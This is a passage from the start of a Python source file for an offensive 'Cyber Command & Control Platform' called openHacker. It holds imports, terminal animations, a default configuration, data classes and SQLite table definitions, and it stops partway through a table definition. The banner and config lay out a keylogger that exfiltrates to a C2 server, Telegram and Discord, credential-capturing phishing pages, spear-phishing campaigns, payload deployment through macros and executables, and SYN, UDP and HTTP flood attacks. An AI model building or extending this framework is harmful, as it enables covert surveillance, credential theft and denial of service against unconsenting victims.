#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██████╗ ██████╗ ███████╗███╗   ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ║
║  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗║
║  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║███████║███████║██║     █████╔╝ █████╗  ██████╔╝║
║  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗║
║  ╚██████╔╝██║     ███████╗██║ ╚████║██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║║
║   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝║
║                                                                              ║
║                    openHacker v1.0.0 - Cyber Command Platform                ║
║                         Author: Ian Carter Kulani, MSc                       ║
║                                                                              ║
║  A complete cybersecurity automation platform featuring:                     ║
║  • 200+ Security Commands                                                    ║
║  • Multi-Platform Bot Integration (Discord, Telegram, Slack, Google Chat)    ║
║  • Stunning Black & White Terminal Web Dashboard                             ║
║  • All Ping/Traceroute/Nmap/Wget Commands                                    ║
║  • Agent Mode with Full Control                                              ║
║  • Automated Threat Monitoring                                               ║
║  • PDF Report Generation                                                     ║
║  • Real Traffic Generation                                                   ║
║  • Social Engineering Suite                                                  ║
║  • Password Cracking Engine                                                  ║
║  • ARP Spoofing & Network Manipulation                                       ║
║  • MAC Address Management                                                    ║
║  • NAT Information                                                           ║
║  • Docker Security Scanning                                                  ║
║  • Email Composition & Sending                                               ║
║  • Keylogger with Exfiltration                                               ║
║  • And much more...                                                          ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import http.server
import socketserver
import webbrowser
import csv
import xml.etree.ElementTree as ET
import xml.dom.minidom as minidom
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# =====================
# VERSION & METADATA
# =====================
VERSION = "1.0.0"
NAME = "openHacker"
AUTHOR = "Ian Carter Kulani, MSc"
DESCRIPTION = "Cyber Command & Control Platform"
TOTAL_LINES = 10000

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Colorama for terminal colors
try:
    import colorama
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file, send_from_directory
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sniff, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.pdfgen import canvas
    from reportlab.lib.colors import HexColor
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# BeautifulSoup
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# =====================
# THEME (Black & White Hacker Theme)
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        PRIMARY = Fore.WHITE + Style.BRIGHT
        SECONDARY = Fore.LIGHTWHITE_EX + Style.BRIGHT
        ACCENT = Fore.WHITE + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.CYAN + Style.BRIGHT
        DARK = Fore.BLACK + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        BG_WHITE = Back.WHITE + Fore.BLACK
        BG_BLACK = Back.BLACK + Fore.WHITE
        BG_DARK = Back.BLACK + Fore.WHITE
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = DARK = WHITE = CYAN = BLUE = GREEN = MAGENTA = BG_WHITE = BG_BLACK = BG_DARK = BOLD = DIM = RESET = ""

# =====================
# TERMINAL ANIMATION ENGINE
# =====================
class TerminalAnimation:
    """Advanced terminal animation engine with multiple animation types"""
    
    @staticmethod
    def spinner(duration: float = 2.0, message: str = "Processing", style: str = "dots"):
        """Display a spinner animation"""
        spinner_chars = {
            'dots': ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
            'line': ['|', '/', '-', '\\'],
            'circle': ['◐', '◓', '◑', '◒'],
            'bounce': ['⠁', '⠂', '⠄', '⠂'],
            'pulse': ['█', '▓', '▒', '░', '▒', '▓']
        }
        chars = spinner_chars.get(style, spinner_chars['dots'])
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            sys.stdout.write(f'\r{Colors.CYAN}{chars[i % len(chars)]} {message}...{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1
        sys.stdout.write('\r' + ' ' * (len(message) + 20) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def progress_bar(iterable, prefix: str = "Progress", length: int = 40, color: str = "CYAN"):
        """Display a progress bar with animation"""
        total = len(iterable)
        color_code = getattr(Colors, color, Colors.CYAN)
        for i, item in enumerate(iterable):
            progress = int(length * i / total)
            bar = '█' * progress + '░' * (length - progress)
            percent = int(100 * i / total)
            sys.stdout.write(f'\r{color_code}{prefix}: [{bar}] {percent}% ({i}/{total}){Colors.RESET}')
            sys.stdout.flush()
            yield item
        sys.stdout.write(f'\r{color_code}{prefix}: [{"█" * length}] 100% ({total}/{total}){Colors.RESET}\n')
        sys.stdout.flush()
    
    @staticmethod
    def typing_effect(text: str, delay: float = 0.04, color: str = "CYAN"):
        """Display text with typing effect"""
        color_code = getattr(Colors, color, Colors.CYAN)
        for char in text:
            sys.stdout.write(f'{color_code}{char}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def matrix_rain(duration: float = 2.0, density: int = 10):
        """Display matrix rain animation"""
        try:
            columns = shutil.get_terminal_size().columns
            chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
            start_time = time.time()
            while time.time() - start_time < duration:
                for _ in range(density):
                    row = ''.join(random.choice(chars) for _ in range(columns))
                    sys.stdout.write(f'\r{Colors.WHITE}{row}{Colors.RESET}')
                    sys.stdout.flush()
                    time.sleep(0.03)
            sys.stdout.write('\r' + ' ' * columns + '\r')
            sys.stdout.flush()
        except:
            pass
    
    @staticmethod
    def pulse_animation(text: str, duration: float = 2.0, color: str = "CYAN"):
        """Display pulsing text animation"""
        color_code = getattr(Colors, color, Colors.CYAN)
        start_time = time.time()
        while time.time() - start_time < duration:
            for brightness in range(0, 100, 10):
                if brightness < 50:
                    style = Style.DIM
                else:
                    style = Style.BRIGHT
                sys.stdout.write(f'\r{color_code}{style}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.03)
            for brightness in range(100, 0, -10):
                if brightness > 50:
                    style = Style.BRIGHT
                else:
                    style = Style.DIM
                sys.stdout.write(f'\r{color_code}{style}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.03)
        sys.stdout.write('\r' + ' ' * len(text) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def wave_animation(text: str, duration: float = 2.0):
        """Display wave animation"""
        start_time = time.time()
        colors = [Colors.WHITE, Colors.CYAN, Colors.WHITE, Colors.WHITE]
        while time.time() - start_time < duration:
            for i, color in enumerate(colors):
                prefix = ' ' * i
                sys.stdout.write(f'\r{color}{prefix}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * len(text) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def loading_bars(duration: float = 2.0, message: str = "Loading"):
        """Display loading bars animation"""
        start_time = time.time()
        while time.time() - start_time < duration:
            for i in range(1, 11):
                bar = '█' * i + '░' * (10 - i)
                sys.stdout.write(f'\r{Colors.WHITE}{message} [{bar}] {i*10}%{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.05)
        sys.stdout.write('\r' + ' ' * (len(message) + 20) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def countdown(seconds: int, message: str = "Starting in"):
        """Display countdown animation"""
        for i in range(seconds, 0, -1):
            sys.stdout.write(f'\r{Colors.WHITE}{message} {i}...{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write('\r' + ' ' * (len(message) + 10) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def glitch_effect(text: str, duration: float = 1.0):
        """Display glitch effect animation"""
        start_time = time.time()
        while time.time() - start_time < duration:
            chars = list(text)
            for _ in range(random.randint(1, 3)):
                idx = random.randint(0, len(chars) - 1)
                chars[idx] = random.choice(['#', '@', '!', '*', '&', '%', '$'])
            glitched = ''.join(chars)
            colors = [Colors.RED, Colors.GREEN, Colors.BLUE, Colors.MAGENTA, Colors.CYAN, Colors.WHITE]
            sys.stdout.write(f'\r{random.choice(colors)}{glitched}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.05)
        sys.stdout.write(f'\r{Colors.WHITE}{text}{Colors.RESET}\n')
        sys.stdout.flush()
    
    @staticmethod
    def neural_network_animation(duration: float = 2.0):
        """Display neural network-like animation"""
        nodes = ['●', '○', '◉', '◎', '◈', '◇']
        start_time = time.time()
        while time.time() - start_time < duration:
            pattern = ''.join(random.choice(nodes) for _ in range(20))
            sys.stdout.write(f'\r{Colors.WHITE}{pattern}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.05)
        sys.stdout.write('\r' + ' ' * 20 + '\r')
        sys.stdout.flush()

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".openhacker"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "openhacker.db")
LOG_FILE = os.path.join(CONFIG_DIR, "openhacker.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "openhacker_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = "temp"
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
ARP_LOGS_DIR = os.path.join(CONFIG_DIR, "arp_logs")
MAC_LOGS_DIR = os.path.join(CONFIG_DIR, "mac_logs")
NAT_LOGS_DIR = os.path.join(CONFIG_DIR, "nat_logs")
PLATFORM_LOGS_DIR = os.path.join(CONFIG_DIR, "platform_logs")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
EMAIL_COMPOSER_DIR = os.path.join(CONFIG_DIR, "email_composer")
PDF_REPORTS_DIR = os.path.join(REPORT_DIR, "pdf_reports")
THREAT_MONITOR_DIR = os.path.join(CONFIG_DIR, "threat_monitor")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, SPEAR_PHISHING_DIR,
    EMAIL_TEMPLATES_DIR, DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR,
    MODULES_DIR, NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR, CRACKING_DIR, ARP_LOGS_DIR, MAC_LOGS_DIR, 
    NAT_LOGS_DIR, PLATFORM_LOGS_DIR, DOCKER_SCANS_DIR, EMAIL_COMPOSER_DIR,
    PDF_REPORTS_DIR, THREAT_MONITOR_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - OPENHACKER - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("OpenHacker")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    MIXED = "mixed"
    RANDOM = "random"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"

class DeploymentType(Enum):
    PDF = "pdf"
    EMAIL = "email"
    LINK = "link"
    EXECUTABLE = "executable"
    DOCUMENT = "document"
    MACRO = "macro"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class SpearPhishingCampaign:
    id: str
    name: str
    template: str
    subject: str
    from_email: str
    targets: List[Dict]
    sent_count: int = 0
    open_count: int = 0
    click_count: int = 0
    status: str = "draft"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    scheduled_time: Optional[str] = None

@dataclass
class KeylogEntry:
    timestamp: str
    text: str
    window: str
    process: str
    screenshot: Optional[str] = None

@dataclass
class Deployment:
    id: str
    name: str
    type: str
    payload: str
    target: str
    created_at: str
    delivered: bool = False
    opened: bool = False
    executed: bool = False

@dataclass
class DomainHost:
    id: str
    ip: str
    domain: str
    hosting_path: str
    created_at: str
    active: bool = True

@dataclass
class ARPSpoofResult:
    target_ip: str
    gateway_ip: str
    interface: str
    status: str
    packets_sent: int
    duration: float
    started_at: str
    ended_at: str

@dataclass
class MACInfo:
    mac_address: str
    vendor: str
    ip_address: str
    hostname: str
    first_seen: str
    last_seen: str

@dataclass
class NATInfo:
    public_ip: str
    private_ip: str
    router_ip: str
    country: str
    isp: str
    nat_type: str

@dataclass
class EmailMessage:
    to: str
    subject: str
    body: str
    from_email: str
    attachments: List[str] = field(default_factory=list)
    html: bool = False
    sent_at: Optional[str] = None
    status: str = "draft"

@dataclass
class PDFReport:
    title: str
    target: str
    analysis: Dict
    timestamp: str
    file_path: str
    status: str = "generated"

@dataclass
class ThreatMonitorConfig:
    enabled: bool = True
    interval: int = 300
    targets: List[str] = field(default_factory=list)
    scan_types: List[str] = field(default_factory=lambda: ["quick", "vuln"])
    auto_block: bool = False
    block_threshold: str = "high"
    report_enabled: bool = True
    report_interval: int = 3600
    last_scan: Optional[str] = None
    next_scan: Optional[str] = None

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "pdf",
        "generate_graphics": True,
        "threat_monitor": {
            "enabled": True,
            "interval": 300,
            "targets": [],
            "scan_types": ["quick", "vuln"],
            "auto_block": False,
            "block_threshold": "high",
            "report_enabled": True,
            "report_interval": 3600
        },
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True
        },
        "web": {
            "enabled": True,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": False,
            "username": "admin",
            "password_hash": ""
        },
        "email": {
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "from_email": "",
            "tls": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "spear_phishing": {
            "enabled": True,
            "track_opens": True,
            "track_clicks": True
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_timeout": 60,
            "attack_types": ["syn", "udp", "http", "icmp"]
        },
        "agent": {
            "enabled": False,
            "server_url": "",
            "heartbeat_interval": 30,
            "command_poll_interval": 5
        },
        "network_monitor": {
            "enabled": True,
            "interface": "eth0",
            "promiscuous": False,
            "packet_capture_limit": 1000
        },
        "deployment": {
            "enabled": True,
            "pdf_template": "",
            "email_template": "",
            "link_expiry": 3600,
            "download_url": ""
        },
        "cracking": {
            "enabled": True,
            "hashcat_path": "",
            "wordlist_path": "",
            "default_hash_type": 0,
            "max_threads": 4
        },
        "arp_spoofing": {
            "enabled": True,
            "interface": "eth0",
            "enable_ip_forward": True,
            "sniff_interval": 60
        },
        "docker": {
            "enabled": True,
            "scan_timeout": 300,
            "benchmark_enabled": True
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS mac_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_address TEXT UNIQUE NOT NULL,
                vendor TEXT,
                ip_address TEXT,
                hostname TEXT,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS arp_spoofing (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT NOT NULL,
                gateway_ip TEXT NOT NULL,
                interface TEXT,
                status TEXT DEFAULT 'active',
                packets_sent INTEGER DEFAULT 0,
                duration REAL,
                started_at DATETIME,
                ended_at DATETIME,
                UNIQUE(target_ip, gateway_ip)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS domain_hosting (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                domain TEXT NOT NULL UNIQUE,
                hosting_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                port INTEGER DEFAULT 8080
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
